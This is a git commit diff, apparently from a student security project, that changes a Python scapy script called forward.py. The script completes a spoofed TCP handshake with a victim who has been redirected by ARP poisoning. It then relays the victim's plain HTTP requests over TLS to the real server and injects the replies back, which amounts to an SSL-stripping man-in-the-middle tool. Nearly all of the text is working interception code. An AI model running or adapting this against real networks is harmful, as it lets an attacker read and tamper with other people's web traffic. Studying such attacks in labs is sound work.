597d40359246fd75051f4fee2c76fd4d54634b93
Geert van Wordragen <g.c.v.wordragen@student.tue.nl>
2019-04-09 23:08:50 +0200

    Changed forward.py to connect to the server via SSL

--- forward.py
+++ forward.py
@@ -1,38 +1,42 @@
 from scapy.all import *
+from scapy_ssl_tls.ssl_tls import *
 from arppoison import gethostmac
 
-def forward(p, ipToSpoof, ipVictim, ipLayerS, ipLayerC, ifa):
-    if p[IP].src == ipToSpoof:
-        send(ipLayerC / p[TCP], iface = ifa, verbose = False)
-    elif p[IP].src == ipVictim:
-        send(ipLayerS / p[TCP], iface = ifa, verbose = False)
-    return p.summary()
+tls_version = TLSVersion.TLS_1_2
+ciphers = [TLSCipherSuite.ECDHE_RSA_WITH_AES_128_GCM_SHA256]
+extensions = [TLSExtension() / TLSExtECPointsFormat(), TLSExtension() / TLSExtSupportedGroups()]
+
+def forward(p, port, ipLayerC, ifa, socket):
+    answer = socket.do_round_trip(p)
+    tcpLayer = TCP(sport = 80, dport = port, seq = p.ack, ack = p.seq + len(p.load), load = answer.load)
+    send(ipLayerC / tcpLayer, iface = ifa, verbose = False)
+    return p.summary() + "\n" + answer.summary()
         
 def startforwarding(ipToSpoof, ifa, timeOut, output):
     attackerMac = gethostmac(ifa)
     print "Listening as " + ipToSpoof
 
     # SYN from client
-    a = sniff(count = 1, filter = "tcp and port 80 and host " + ipToSpoof, iface = ifa)
+    a = sniff(count = 1, filter = "tcp and port 80 and dst host " + ipToSpoof, iface = ifa)
     ipVictim = a[0][IP].src
     port = a[0].sport
     print "Connection from " + ipVictim + ":" + str(port)
 
-    # SYN to server
-    ipLayerS = IP(src = ipVictim, dst = ipToSpoof)
-    tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = a[0].seq, window = a[0].window)
-    answer = sr1(ipLayerS / tcpLayer, iface = ifa) # SYNACK from server
-
     # SYNACK to client
     ipLayerC = IP(src = ipToSpoof, dst = ipVictim)
-    synAck = TCP(sport = 80, dport = port, flags = "SA", seq = answer.seq, ack = answer.ack, window = answer.window)
+    synAck = TCP(sport = 80, dport = port, flags = "SA", seq = a[0].seq, ack = a[0].seq + 1)
     send(ipLayerC / synAck, iface = ifa)
     print "Handshake completed"
     print "---------------------"
 
-    packets = sniff(filter = "tcp", iface = ifa, timeout = timeOut,
-        lfilter = lambda(p): p[Ether].src != attackerMac,
-        prn = lambda(p): forward(p, ipToSpoof, ipVictim, ipLayerS, ipLayerC, ifa))
-    #save sniffed packets
-    if (output)
-        wrpcap(output, packets)
+    with TLSSocket(client = True) as socket:
+        # Establish an SSL connection with the server
+        socket.connect((ipToSpoof, 443))
+        server_hello = socket.do_handshake(tls_version, ciphers, extensions)
+
+        packets = sniff(filter = "tcp and src host " + ipVictim, iface = ifa, timeout = timeOut,
+            prn = lambda(p): forward(p, port, ipLayerC, ifa, socket))
+
+        #save sniffed packetsS
+        if output:
+            wrpcap(output, packets)
